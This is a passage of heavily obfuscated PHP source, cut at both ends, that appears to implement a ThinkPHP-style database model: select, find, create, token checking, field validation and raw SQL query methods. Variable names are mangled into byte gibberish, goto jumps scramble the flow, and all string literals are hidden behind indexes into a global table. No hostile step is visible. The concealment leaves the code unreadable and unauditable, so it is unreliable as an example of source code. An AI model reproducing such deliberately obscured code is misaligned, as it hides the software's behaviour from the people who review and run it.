$böµ»‹ŸÏ°; } $this->_after_delete($c²©ö½ìå‘, $DŞˆœ…Ô‰¢); } return $dß‹Â±ØŠ; goto b£Í”‰‹Ğ; b£Í”‰‹Ğ: } protected function _after_delete($dñ¥µ’„²³, $bÓÌèå¿í) { } public function select($aìŞÍ‘ùŸò = array()) { goto bßÓ«Ì°ê¤; dÇòØ¡ëà³: $B™…‘’¯§ù = $this->db->select($aìŞÍ‘ùŸò); if (!1 === $B™…‘’¯§ù) { return !1; } if (empty($B™…‘’¯§ù)) { return null; } goto bô±ÎÏÒÄÆ; bô±ÎÏÒÄÆ: $this->_afterSelect($B™…‘’¯§ù, $aìŞÍ‘ùŸò); return $B™…‘’¯§ù; goto FÂÄŠÙ­—»; bßÓ«Ì°ê¤: $fñ…… ²çà =& $_SERVER[¾÷]; if (is_string($aìŞÍ‘ùŸò) || is_numeric($aìŞÍ‘ùŸò)) { $BÕ¿ ÁãÓ” = $this->getPk(); if (strpos($aìŞÍ‘ùŸò, $fñ…… ²çà[57])) { $A“ÏÄ‰ˆ©[$BÕ¿ ÁãÓ”] = array($fñ…… ²çà[281], $aìŞÍ‘ùŸò); } else { $A“ÏÄ‰ˆ©[$BÕ¿ ÁãÓ”] = $aìŞÍ‘ùŸò; } $this->options[$fñ…… ²çà[280]] = $A“ÏÄ‰ˆ©; } elseif (!1 === $aìŞÍ‘ùŸò) { $aìŞÍ‘ùŸò = $this->_parseOptions(); return $fñ…… ²çà[282] . $this->db->buildSelectSql($aìŞÍ‘ùŸò) . $fñ…… ²çà[283]; } $aìŞÍ‘ùŸò = $this->_parseOptions(); goto dÇòØ¡ëà³; FÂÄŠÙ­—»: } protected function _afterSelect(&$E‚Íõö›¤, $EİŒÙ™Õ) { } public function buildSql($b×åÆ¹¹ÊÄ = array()) { $eÁ‰õçÄØã =& $_SERVER[¾÷]; $b×åÆ¹¹ÊÄ = $this->_parseOptions($b×åÆ¹¹ÊÄ); return $eÁ‰õçÄØã[282] . $this->db->buildSelectSql($b×åÆ¹¹ÊÄ) . $eÁ‰õçÄØã[283]; } public function optionsValue($CÜ‡äË‰ = null) { if (is_null($CÜ‡äË‰)) { return $this->options; } elseif (is_array($CÜ‡äË‰)) { $this->options = array_merge($this->options, $CÜ‡äË‰); } } protected function _parseOptions($cµ‹È®ôˆ‚ = array()) { goto E¯‡åí¹æ; E¯‡åí¹æ: $Ešô—£†Æ =& $_SERVER[¾÷]; if (is_array($cµ‹È®ôˆ‚)) { $cµ‹È®ôˆ‚ = array_merge($this->options, $cµ‹È®ôˆ‚); } $this->options = array(); goto C ƒ¹ßŒ÷; C ƒ¹ßŒ÷: if (!isset($cµ‹È®ôˆ‚[$Ešô—£†Æ[284]])) { $cµ‹È®ôˆ‚[$Ešô—£†Æ[284]] = $this->getTableName(); $aà–‘‰ˆ´ = $this->fields; } else { $aà–‘‰ˆ´ = $this->getDbFields(); } if (!empty($cµ‹È®ôˆ‚[$Ešô—£†Æ[285]])) { $cµ‹È®ôˆ‚[$Ešô—£†Æ[284]] .= $Ešô—£†Æ[60] . $cµ‹È®ôˆ‚[$Ešô—£†Æ[285]]; } $cµ‹È®ôˆ‚[$Ešô—£†Æ[286]] = $this->name; goto b¼ì›‡ï ; b¼ì›‡ï : if (isset($cµ‹È®ôˆ‚[$Ešô—£†Æ[280]]) && is_array($cµ‹È®ôˆ‚[$Ešô—£†Æ[280]]) && !empty($aà–‘‰ˆ´) && !isset($cµ‹È®ôˆ‚[$Ešô—£†Æ[287]]) && !isset($cµ‹È®ôˆ‚[$Ešô—£†Æ[284]])) { foreach ($cµ‹È®ôˆ‚[$Ešô—£†Æ[280]] as $F¥ŞëïÌ–‰ => $e¼øšœ‰·Ø) { $F¥ŞëïÌ–‰ = trim($F¥ŞëïÌ–‰); if (in_array($F¥ŞëïÌ–‰, $aà–‘‰ˆ´, !0)) { if (is_scalar($e¼øšœ‰·Ø)) { $this->_parseType($cµ‹È®ôˆ‚[$Ešô—£†Æ[280]], $F¥ŞëïÌ–‰); } } elseif (!is_numeric($F¥ŞëïÌ–‰) && $Ešô—£†Æ[80] != substr($F¥ŞëïÌ–‰, 0, 1) && !1 === strpos($F¥ŞëïÌ–‰, $Ešô—£†Æ[104]) && !1 === strpos($F¥ŞëïÌ–‰, $Ešô—£†Æ[265]) && !1 === strpos($F¥ŞëïÌ–‰, $Ešô—£†Æ[288]) && !1 === strpos($F¥ŞëïÌ–‰, $Ešô—£†Æ[289])) { unset($cµ‹È®ôˆ‚[$Ešô—£†Æ[280]][$F¥ŞëïÌ–‰]); } } } $this->_options_filter($cµ‹È®ôˆ‚); return $cµ‹È®ôˆ‚; goto DöÇ¡‡¯à; DöÇ¡‡¯à: } protected function _options_filter(&$B”£áÆˆó) { } protected function _parseType(&$dÎŒÎèÈã, $Eëİ¸‚®) { $eáÍ‚¿Õ¬¾ =& $_SERVER[¾÷]; if (empty($this->options[$eáÍ‚¿Õ¬¾[290]][$eáÍ‚¿Õ¬¾[14] . $Eëİ¸‚®])) { $BºÔ‚‹™ = strtolower($this->fields[$eáÍ‚¿Õ¬¾[257]][$Eëİ¸‚®]); if (!1 !== strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[291])) { } elseif (!1 === strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[292]) && !1 !== strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[293])) { $dÎŒÎèÈã[$Eëİ¸‚®] = intval($dÎŒÎèÈã[$Eëİ¸‚®]); } elseif (!1 !== strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[294]) || !1 !== strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[295])) { $dÎŒÎèÈã[$Eëİ¸‚®] = floatval($dÎŒÎèÈã[$Eëİ¸‚®]); } elseif (!1 !== strpos($BºÔ‚‹™, $eáÍ‚¿Õ¬¾[296])) { $dÎŒÎèÈã[$Eëİ¸‚®] = (bool) $dÎŒÎèÈã[$Eëİ¸‚®]; } } } public function find($C®À‰í·ğ‡ = array()) { goto BùØ‹ÕÛ; d‘×ëÃõ»Õ: $C®À‰í·ğ‡ = $this->_parseOptions(); $d®àŒ½åáñ = $this->db->select($C®À‰í·ğ‡); if (!1 === $d®àŒ½åáñ) { return !1; } goto BÊãº¹–ä; BùØ‹ÕÛ: $Aİ²ë‡Õ´ =& $_SERVER[¾÷]; if (is_numeric($C®À‰í·ğ‡) || is_string($C®À‰í·ğ‡)) { $Dê´ˆ÷•Şî[$this->getPk()] = intval($C®À‰í·ğ‡); $this->options[$Aİ²ë‡Õ´[280]] = $Dê´ˆ÷•Şî; } $this->options[$Aİ²ë‡Õ´[297]] = 1; goto d‘×ëÃõ»Õ; BÊãº¹–ä: if (empty($d®àŒ½åáñ)) { return null; } $this->data = $d®àŒ½åáñ[0]; $this->_afterFind($this->data, $C®À‰í·ğ‡); goto AÕŒ…Ä¦Ò¸; AÕŒ…Ä¦Ò¸: if (!empty($this->options[$Aİ²ë‡Õ´[298]])) { return $this->returnResult($this->data, $this->options[$Aİ²ë‡Õ´[298]]); } return $this->data; goto DáàÃ¨‘ìô; DáàÃ¨‘ìô: } protected function _afterFind(&$Aáæ×Àç„À, $aÎÏõ¹í¿) { } protected function returnResult($B×–“ƒ¼»®, $CŞÆô ê¼ = '') { $B²ƒ…·Ú¥« =& $_SERVER[¾÷]; if ($CŞÆô ê¼) { if (is_callable($CŞÆô ê¼)) { return call_user_func($CŞÆô ê¼, $B×–“ƒ¼»®); } switch (strtolower($CŞÆô ê¼)) { case $B²ƒ…·Ú¥«[299]: return json_encode($B×–“ƒ¼»®); case $B²ƒ…·Ú¥«[300]: return xml_encode($B×–“ƒ¼»®); } } return $B×–“ƒ¼»®; } public function parseFieldsMap($d£ëŞ‡‚˜, $C©Ï—ÕàÃ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $aßò¥„â–¿ => $F°Ä½Í¬Ëâ) { if ($C©Ï—ÕàÃ == 1) { if (isset($d£ëŞ‡‚˜[$F°Ä½Í¬Ëâ])) { $d£ëŞ‡‚˜[$aßò¥„â–¿] = $d£ëŞ‡‚˜[$F°Ä½Í¬Ëâ]; unset($d£ëŞ‡‚˜[$F°Ä½Í¬Ëâ]); } } else { if (isset($d£ëŞ‡‚˜[$aßò¥„â–¿])) { $d£ëŞ‡‚˜[$F°Ä½Í¬Ëâ] = $d£ëŞ‡‚˜[$aßò¥„â–¿]; unset($d£ëŞ‡‚˜[$aßò¥„â–¿]); } } } } return $d£ëŞ‡‚˜; } public function setField($DÁ„ˆŒ»Şë, $EÎ¡×¡âƒ† = '') { if (is_array($DÁ„ˆŒ»Şë)) { $DÇÓË­¸©í = $DÁ„ˆŒ»Şë; } else { $DÇÓË­¸©í[$DÁ„ˆŒ»Şë] = $EÎ¡×¡âƒ†; } return $this->save($DÇÓË­¸©í); } public function setAdd($AÇ²®ÎÀ˜ï, $Eé£ßö¸æº = 1) { $c§Ãõ‡ã®“ =& $_SERVER[¾÷]; $dÈÁÒ’ÔÅ¥ = $AÇ²®ÎÀ˜ï . $c§Ãõ‡ã®“[301] . $Eé£ßö¸æº; if ($Eé£ßö¸æº < 0) { $dÈÁÒ’ÔÅ¥ = $AÇ²®ÎÀ˜ï . $Eé£ßö¸æº; } return $this->setField($AÇ²®ÎÀ˜ï, array($c§Ãõ‡ã®“[302], $dÈÁÒ’ÔÅ¥)); } public function getField($EøêŠ¼ª±æ, $bÊ÷‹§öÙµ = null) { $F»İ‹ŒÏã÷ =& $_SERVER[¾÷]; $D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[278]] = $EøêŠ¼ª±æ; $D´›ÔÌ‡¹ = $this->_parseOptions($D´›ÔÌ‡¹); $EøêŠ¼ª±æ = trim($EøêŠ¼ª±æ); if (strpos($EøêŠ¼ª±æ, $F»İ‹ŒÏã÷[57])) { if (!isset($D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[297]])) { $D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[297]] = is_numeric($bÊ÷‹§öÙµ) ? $bÊ÷‹§öÙµ : $F»İ‹ŒÏã÷[43]; } $c¢·œÜĞ»Ğ = $this->db->select($D´›ÔÌ‡¹); if (!empty($c¢·œÜĞ»Ğ)) { goto fóõ†¸Ó…Ú; DÄƒŒÂ¥¥Â: $CæÛé†íÛ = array_shift($EøêŠ¼ª±æ); $Aîßå‡Ïéˆ = array(); $AøÃˆ›¦á = count($d…Öá¼¿); goto FÌ­¿™ĞÁÇ; FÌ­¿™ĞÁÇ: foreach ($c¢·œÜĞ»Ğ as $b—ŞÎæ²‘£) { $Cºî–ó¡Çß = $b—ŞÎæ²‘£[$F¤èÔ‡„œŞ]; if (2 == $AøÃˆ›¦á) { $Aîßå‡Ïéˆ[$Cºî–ó¡Çß] = $b—ŞÎæ²‘£[$CæÛé†íÛ]; } else { $Aîßå‡Ïéˆ[$Cºî–ó¡Çß] = is_string($bÊ÷‹§öÙµ) ? implode($bÊ÷‹§öÙµ, $b—ŞÎæ²‘£) : $b—ŞÎæ²‘£; } } return $Aîßå‡Ïéˆ; goto A¸’ŠØ³ Û; fóõ†¸Ó…Ú: $d…Öá¼¿ = explode($F»İ‹ŒÏã÷[57], $EøêŠ¼ª±æ); $EøêŠ¼ª±æ = array_keys($c¢·œÜĞ»Ğ[0]); $F¤èÔ‡„œŞ = array_shift($EøêŠ¼ª±æ); goto DÄƒŒÂ¥¥Â; A¸’ŠØ³ Û: } } else { if (!0 !== $bÊ÷‹§öÙµ) { $D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[297]] = is_numeric($bÊ÷‹§öÙµ) ? $bÊ÷‹§öÙµ : 1; } if ($bÊ÷‹§öÙµ === $F»İ‹ŒÏã÷[260]) { unset($D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[297]]); } $b—ŞÎæ²‘£ = $this->db->select($D´›ÔÌ‡¹); if (!empty($b—ŞÎæ²‘£)) { if ($bÊ÷‹§öÙµ === $F»İ‹ŒÏã÷[260]) { return reset($b—ŞÎæ²‘£[0]); } if (!0 !== $bÊ÷‹§öÙµ && 1 == $D´›ÔÌ‡¹[$F»İ‹ŒÏã÷[297]]) { return reset($b—ŞÎæ²‘£[0]); } foreach ($b—ŞÎæ²‘£ as $f¢î‹¦«ªÑ) { $AÅØğĞ¥—[] = $f¢î‹¦«ªÑ[$EøêŠ¼ª±æ]; } return $AÅØğĞ¥—; } } return null; } public function create($F±Â‘’é× = '', $c®¦«Ú¡Ø = '') { goto dèŞá²êëÆ; AâÄàñ³Ôğ: if (isset($dÃñÇ¥ƒ©)) { if (is_string($dÃñÇ¥ƒ©)) { $dÃñÇ¥ƒ© = explode($CøÒ¾ÕÓ³[57], $dÃñÇ¥ƒ©); } if (think_config($CøÒ¾ÕÓ³[303])) { $dÃñÇ¥ƒ©[] = think_config($CøÒ¾ÕÓ³[304]); } foreach ($F±Â‘’é× as $bºÕÙï‰” => $dÉ“«‡øÑ) { if (!in_array($bºÕÙï‰”, $dÃñÇ¥ƒ©)) { unset($F±Â‘’é×[$bºÕÙï‰”]); } } } if (!$this->autoValidation($F±Â‘’é×, $c®¦«Ú¡Ø)) { return !1; } if (!$this->autoCheckToken($F±Â‘’é×)) { $this->error = think_lang($CøÒ¾ÕÓ³[305]); return !1; } goto bÔ¸ŒÙÑé²; bÔ¸ŒÙÑé²: if ($this->autoCheckFields) { $dÃñÇ¥ƒ© = $this->getDbFields(); foreach ($F±Â‘’é× as $bºÕÙï‰” => $dÉ“«‡øÑ) { if (!in_array($bºÕÙï‰”, $dÃñÇ¥ƒ©)) { unset($F±Â‘’é×[$bºÕÙï‰”]); } elseif (MAGIC_QUOTES_GPC && is_string($dÉ“«‡øÑ)) { $F±Â‘’é×[$bºÕÙï‰”] = stripslashes($dÉ“«‡øÑ); } } } $this->autoOperation($F±Â‘’é×, $c®¦«Ú¡Ø); $this->data = $F±Â‘’é×; goto EÑ¨ÔöÃ¡; EÑ¨ÔöÃ¡: return $F±Â‘’é×; goto cè£¢•ÙÜ¨; DÉŠ¡Åãº: $F±Â‘’é× = $this->parseFieldsMap($F±Â‘’é×, 0); $c®¦«Ú¡Ø = $c®¦«Ú¡Ø ? $c®¦«Ú¡Ø : (!empty($F±Â‘’é×[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$CøÒ¾ÕÓ³[278]])) { $dÃñÇ¥ƒ© = $this->options[$CøÒ¾ÕÓ³[278]]; unset($this->options[$CøÒ¾ÕÓ³[278]]); } elseif ($c®¦«Ú¡Ø == THINK_MODEL_INSERT && isset($this->insertFields)) { $dÃñÇ¥ƒ© = $this->insertFields; } elseif ($c®¦«Ú¡Ø == THINK_MODEL_UPDATE && isset($this->updateFields)) { $dÃñÇ¥ƒ© = $this->updateFields; } goto AâÄàñ³Ôğ; dèŞá²êëÆ: $CøÒ¾ÕÓ³ =& $_SERVER[¾÷]; if (empty($F±Â‘’é×)) { $F±Â‘’é× = $_POST; } elseif (is_object($F±Â‘’é×)) { $F±Â‘’é× = get_object_vars($F±Â‘’é×); } if (empty($F±Â‘’é×) || !is_array($F±Â‘’é×)) { $this->error = think_lang($CøÒ¾ÕÓ³[276]); return !1; } goto DÉŠ¡Åãº; cè£¢•ÙÜ¨: } public function autoCheckToken($a÷¸èÜ¼ÁÂ) { $fæËâôÉÙ =& $_SERVER[¾÷]; if (isset($this->options[$fæËâôÉÙ[306]]) && !$this->options[$fæËâôÉÙ[306]]) { return !0; } if (think_config($fæËâôÉÙ[303])) { $cƒ¿º³ïğ£ = think_config($fæËâôÉÙ[304]); if (!isset($a÷¸èÜ¼ÁÂ[$cƒ¿º³ïğ£]) || Session::get($cƒ¿º³ïğ£)) { return !1; } list($B×äß¿íŠ, $B½ÜµèÛõ™) = explode($fæËâôÉÙ[80], $a÷¸èÜ¼ÁÂ[$cƒ¿º³ïğ£]); if ($B½ÜµèÛõ™ && Session::get($cƒ¿º³ïğ£ . $fæËâôÉÙ[104] . $B×äß¿íŠ) === $B½ÜµèÛõ™) { Session::remove($cƒ¿º³ïğ£ . $fæËâôÉÙ[104] . $B×äß¿íŠ); return !0; } if (think_config($fæËâôÉÙ[307])) { Session::remove($cƒ¿º³ïğ£ . $fæËâôÉÙ[104] . $B×äß¿íŠ); } return !1; } return !0; } public function regex($eªÊµš˜ÆŒ, $e—Ç×Œ´ñÙ) { $bğ¢À¤ªâ =& $_SERVER[¾÷]; $Bó ö›¥Ñ = array($bğ¢À¤ªâ[308] => $bğ¢À¤ªâ[309], $bğ¢À¤ªâ[310] => $bğ¢À¤ªâ[311], $bğ¢À¤ªâ[312] => $bğ¢À¤ªâ[313], $bğ¢À¤ªâ[314] => $bğ¢À¤ªâ[315], $bğ¢À¤ªâ[316] => $bğ¢À¤ªâ[317], $bğ¢À¤ªâ[318] => $bğ¢À¤ªâ[319], $bğ¢À¤ªâ[320] => $bğ¢À¤ªâ[321], $bğ¢À¤ªâ[295] => $bğ¢À¤ªâ[322], $bğ¢À¤ªâ[323] => $bğ¢À¤ªâ[324]); if (isset($Bó ö›¥Ñ[strtolower($e—Ç×Œ´ñÙ)])) { $e—Ç×Œ´ñÙ = $Bó ö›¥Ñ[strtolower($e—Ç×Œ´ñÙ)]; } return preg_match($e—Ç×Œ´ñÙ, $eªÊµš˜ÆŒ) === 1; } private function autoOperation(&$f”‘÷§ïò, $eï••È½êÉ) { $bÊ„ë‚Çª™ =& $_SERVER[¾÷]; if (!empty($this->options[$bÊ„ë‚Çª™[325]])) { $d…ä¬Å†ç = $this->options[$bÊ„ë‚Çª™[325]]; unset($this->options[$bÊ„ë‚Çª™[325]]); } elseif (!empty($this->_auto)) { $d…ä¬Å†ç = $this->_auto; } if (isset($d…ä¬Å†ç)) { foreach ($d…ä¬Å†ç as $bÉÕŒßÅÁÉ) { if (empty($bÉÕŒßÅÁÉ[2])) { $bÉÕŒßÅÁÉ[2] = THINK_MODEL_INSERT; } if ($eï••È½êÉ == $bÉÕŒßÅÁÉ[2] || $bÉÕŒßÅÁÉ[2] == THINK_MODEL_BOTH) { switch (trim($bÉÕŒßÅÁÉ[3])) { case $bÊ„ë‚Çª™[326]: case $bÊ„ë‚Çª™[327]: $cùïöˆÍŸ = isset($bÉÕŒßÅÁÉ[4]) ? (array) $bÉÕŒßÅÁÉ[4] : array(); if (isset($f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]])) { array_unshift($cùïöˆÍŸ, $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]]); } if ($bÊ„ë‚Çª™[326] == $bÉÕŒßÅÁÉ[3]) { $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]] = call_user_func_array($bÉÕŒßÅÁÉ[1], $cùïöˆÍŸ); } else { $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]] = call_user_func_array(array(&$this, $bÉÕŒßÅÁÉ[1]), $cùïöˆÍŸ); } break; case $bÊ„ë‚Çª™[278]: $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]] = $f”‘÷§ïò[$bÉÕŒßÅÁÉ[1]]; break; case $bÊ„ë‚Çª™[328]: if ($bÊ„ë‚Çª™[43] === $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]]) { unset($f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]]); } break; case $bÊ„ë‚Çª™[329]: default: $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]] = $bÉÕŒßÅÁÉ[1]; } if (!1 === $f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]]) { unset($f”‘÷§ïò[$bÉÕŒßÅÁÉ[0]]); } } } } return $f”‘÷§ïò; } protected function autoValidation($EÑËô×•ô, $c†Éíº›“) { $aÒøøØîÒï =& $_SERVER[¾÷]; if (!empty($this->options[$aÒøøØîÒï[330]])) { $E¤¿ßÇ¡™Ç = $this->options[$aÒøøØîÒï[330]]; unset($this->options[$aÒøøØîÒï[330]]); } elseif (!empty($this->_validate)) { $E¤¿ßÇ¡™Ç = $this->_validate; } if (isset($E¤¿ßÇ¡™Ç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($E¤¿ßÇ¡™Ç as $B¾öÅ­£Ö => $cÄ¿Îö´Æø) { if (empty($cÄ¿Îö´Æø[5]) || $cÄ¿Îö´Æø[5] == THINK_MODEL_BOTH || $cÄ¿Îö´Æø[5] == $c†Éíº›“) { if (0 == strpos($cÄ¿Îö´Æø[2], $aÒøøØîÒï[331]) && strpos($cÄ¿Îö´Æø[2], $aÒøøØîÒï[332])) { $cÄ¿Îö´Æø[2] = think_lang(substr($cÄ¿Îö´Æø[2], 2, -1)); } $cÄ¿Îö´Æø[3] = isset($cÄ¿Îö´Æø[3]) ? $cÄ¿Îö´Æø[3] : THINK_EXISTS_VALIDATE; $cÄ¿Îö´Æø[4] = isset($cÄ¿Îö´Æø[4]) ? $cÄ¿Îö´Æø[4] : $aÒøøØîÒï[333]; switch ($cÄ¿Îö´Æø[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($EÑËô×•ô, $cÄ¿Îö´Æø)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($aÒøøØîÒï[43] != trim($EÑËô×•ô[$cÄ¿Îö´Æø[0]])) { if (!1 === $this->_validationField($EÑËô×•ô, $cÄ¿Îö´Æø)) { return !1; } } break; default: if (isset($EÑËô×•ô[$cÄ¿Îö´Æø[0]])) { if (!1 === $this->_validationField($EÑËô×•ô, $cÄ¿Îö´Æø)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($FùÈäŠ·ŞÅ, $aÇØ¨è¹Í·) { if (!1 === $this->_validationFieldItem($FùÈäŠ·ŞÅ, $aÇØ¨è¹Í·)) { if ($this->patchValidate) { $this->error[$aÇØ¨è¹Í·[0]] = $aÇØ¨è¹Í·[2]; } else { $this->error = $aÇØ¨è¹Í·[2]; return !1; } } return; } protected function _validationFieldItem($d­‹¬‰ÙÁ, $e‡í™°ÑÕŸ) { $CŞí­„âœÕ =& $_SERVER[¾÷]; switch (strtolower(trim($e‡í™°ÑÕŸ[4]))) { case $CŞí­„âœÕ[326]: case $CŞí­„âœÕ[327]: $DÚµ¡§Ãå° = isset($e‡í™°ÑÕŸ[6]) ? (array) $e‡í™°ÑÕŸ[6] : array(); if (is_string($e‡í™°ÑÕŸ[0]) && strpos($e‡í™°ÑÕŸ[0], $CŞí­„âœÕ[57])) { $e‡í™°ÑÕŸ[0] = explode($CŞí­„âœÕ[57], $e‡í™°ÑÕŸ[0]); } if (is_array($e‡í™°ÑÕŸ[0])) { foreach ($e‡í™°ÑÕŸ[0] as $c¦Éİ‡ÔÒ”) { $fß§Ç»ØØœ[$c¦Éİ‡ÔÒ”] = $d­‹¬‰ÙÁ[$c¦Éİ‡ÔÒ”]; } array_unshift($DÚµ¡§Ãå°, $fß§Ç»ØØœ); } else { array_unshift($DÚµ¡§Ãå°, $d­‹¬‰ÙÁ[$e‡í™°ÑÕŸ[0]]); } if ($CŞí­„âœÕ[326] == $e‡í™°ÑÕŸ[4]) { return call_user_func_array($e‡í™°ÑÕŸ[1], $DÚµ¡§Ãå°); } else { return call_user_func_array(array(&$this, $e‡í™°ÑÕŸ[1]), $DÚµ¡§Ãå°); } case $CŞí­„âœÕ[334]: return $d­‹¬‰ÙÁ[$e‡í™°ÑÕŸ[0]] == $d­‹¬‰ÙÁ[$e‡í™°ÑÕŸ[1]]; case $CŞí­„âœÕ[335]: if (is_string($e‡í™°ÑÕŸ[0]) && strpos($e‡í™°ÑÕŸ[0], $CŞí­„âœÕ[57])) { $e‡í™°ÑÕŸ[0] = explode($CŞí­„âœÕ[57], $e‡í™°ÑÕŸ[0]); } $a¸š×¼óÎ­ = array(); if (is_array($e‡í™°ÑÕŸ[0])) { foreach ($e‡í™°ÑÕŸ[0] as $c¦Éİ‡ÔÒ”) { $a¸š×¼óÎ­[$c¦Éİ‡ÔÒ”] = $d­‹¬‰ÙÁ[$c¦Éİ‡ÔÒ”]; } } else { $a¸š×¼óÎ­[$e‡í™°ÑÕŸ[0]] = $d­‹¬‰ÙÁ[$e‡í™°ÑÕŸ[0]]; } if (!empty($d­‹¬‰ÙÁ[$this->getPk()])) { $a¸š×¼óÎ­[$this->getPk()] = array($CŞí­„âœÕ[336], $d­‹¬‰ÙÁ[$this->getPk()]); } if ($this->where($a¸š×¼óÎ­)->find()) { return !1; } return !0; default: return $this->check($d­‹¬‰ÙÁ[$e‡í™°ÑÕŸ[0]], $e‡í™°ÑÕŸ[1], $e‡í™°ÑÕŸ[4]); } } public function check($dÈ«µóŞÕÃ, $cƒÔã¡°®‚, $fÉ‡Ã“‹ŞÚ = "\162\x65\x67\x65\170") { $a‚æã×…í =& $_SERVER[¾÷]; $fÉ‡Ã“‹ŞÚ = strtolower(trim($fÉ‡Ã“‹ŞÚ)); switch ($fÉ‡Ã“‹ŞÚ) { case $a‚æã×…í[17]: case $a‚æã×…í[337]: $DĞ¬ôïœ© = is_array($cƒÔã¡°®‚) ? $cƒÔã¡°®‚ : explode($a‚æã×…í[57], $cƒÔã¡°®‚); return $fÉ‡Ã“‹ŞÚ == $a‚æã×…í[17] ? in_array($dÈ«µóŞÕÃ, $DĞ¬ôïœ©) : !in_array($dÈ«µóŞÕÃ, $DĞ¬ôïœ©); case $a‚æã×…í[338]: case $a‚æã×…í[339]: if (is_array($cƒÔã¡°®‚)) { $Cêˆ†ĞÕè = $cƒÔã¡°®‚[0]; $dïÎù‹óë‡ = $cƒÔã¡°®‚[1]; } else { list($Cêˆ†ĞÕè, $dïÎù‹óë‡) = explode($a‚æã×…í[57], $cƒÔã¡°®‚); } return $fÉ‡Ã“‹ŞÚ == $a‚æã×…í[338] ? $dÈ«µóŞÕÃ >= $Cêˆ†ĞÕè && $dÈ«µóŞÕÃ <= $dïÎù‹óë‡ : $dÈ«µóŞÕÃ < $Cêˆ†ĞÕè || $dÈ«µóŞÕÃ > $dïÎù‹óë‡; case $a‚æã×…í[340]: case $a‚æã×…í[341]: return $fÉ‡Ã“‹ŞÚ == $a‚æã×…í[340] ? $dÈ«µóŞÕÃ == $cƒÔã¡°®‚ : $dÈ«µóŞÕÃ != $cƒÔã¡°®‚; case $a‚æã×…í[342]: $Bä¦œÕåË = mb_strlen($dÈ«µóŞÕÃ, $a‚æã×…í[343]); if (strpos($cƒÔã¡°®‚, $a‚æã×…í[57])) { list($Cêˆ†ĞÕè, $dïÎù‹óë‡) = explode($a‚æã×…í[57], $cƒÔã¡°®‚); return $Bä¦œÕåË >= $Cêˆ†ĞÕè && $Bä¦œÕåË <= $dïÎù‹óë‡; } else { return $Bä¦œÕåË == $cƒÔã¡°®‚; } case $a‚æã×…í[344]: list($b³§¼ã„öÉ, $BòñÑ¾áÃâ) = explode($a‚æã×…í[57], $cƒÔã¡°®‚); if (!is_numeric($b³§¼ã„öÉ)) { $b³§¼ã„öÉ = strtotime($b³§¼ã„öÉ); } if (!is_numeric($BòñÑ¾áÃâ)) { $BòñÑ¾áÃâ = strtotime($BòñÑ¾áÃâ); } return NOW_TIME >= $b³§¼ã„öÉ && NOW_TIME <= $BòñÑ¾áÃâ; case $a‚æã×…í[345]: return in_array(get_client_ip(), explode($a‚æã×…í[57], $cƒÔã¡°®‚)); case $a‚æã×…í[346]: return !in_array(get_client_ip(), explode($a‚æã×…í[57], $cƒÔã¡°®‚)); case $a‚æã×…í[333]: default: return $this->regex($dÈ«µóŞÕÃ, $cƒÔã¡°®‚); } } public function query($b÷Î¤´ÌÖ†, $cÒğœªÁƒ» = false) { $AãößÍ¥¬ =& $_SERVER[¾÷]; if (!is_bool($cÒğœªÁƒ») && !is_array($cÒğœªÁƒ»)) { $cÒğœªÁƒ» = func_get_args(); array_shift($cÒğœªÁƒ»); } $b÷Î¤´ÌÖ† = str_replace(array($AãößÍ¥¬[9], $AãößÍ¥¬[347]), $AãößÍ¥¬[60], $b÷Î¤´ÌÖ†); $b÷Î¤´ÌÖ† = $this->parseSql($b÷Î¤´ÌÖ†, $cÒğœªÁƒ»); return $this->db->query($b÷Î¤´ÌÖ†); } public function execute($e×öÒºéõá, $cÑë”¥Ä‰æ = false) { if (!is_bool($cÑë”¥Ä‰æ) && !is_array($cÑë”¥Ä‰æ)) { $cÑë”¥Ä‰æ = func_get_args(); array_shift($cÑë”¥Ä‰æ); } $e×öÒºéõá = $this->parseSql($e×öÒºéõá, $cÑë”¥Ä‰æ); return $this->db->execute($e×öÒºéõá); } protected function parseSql($aí¿¿ÛÑÛ, $D„äô“à©) { $DÅ¢À‡±œ© =& $_SERVER[¾÷]; if (!0 === $D„äô“à©) { $eÛ«ö‘¾È = $this->_parseOptions(); $aí¿¿ÛÑÛ = $this->db->parseSql($aí¿¿ÛÑÛ, $eÛ«ö‘¾È); } elseif (is_array($D„äô“à©)) { $D„äô“à© = array_map(array($this->db, $DÅ¢À‡±œ©[348]), $D„äô“à©); $aí¿¿ÛÑÛ = vsprintf($aí¿¿ÛÑÛ, $D„äô“à©); } else { $aí¿¿ÛÑÛ = strtr($aí¿¿ÛÑÛ, array($DÅ¢À‡±œ©[349] => $this->getTableName(), $DÅ¢À‡±œ©[350] => think_config($DÅ¢À‡±œ©[249]))); } $this->db->setModel($this->name); return $aí¿¿ÛÑÛ; } public function db($fä¡óÑõ›ê = '', $d›«ä¶‘¸ = '', $bòàŠ•ø = array()) { goto b¬£¤¯ç‡; DŠ©µÖÄ´: static $EìŞ´„„Ÿ¶ = array(); if (!isset($EìŞ´„„Ÿ¶[$fä¡óÑõ›ê]) || isset($EìŞ´„„Ÿ¶[$fä¡óÑõ›ê]) && $d›«ä¶‘¸ && $B•æˆ«ƒ¿ [$fä¡óÑõ›ê] != 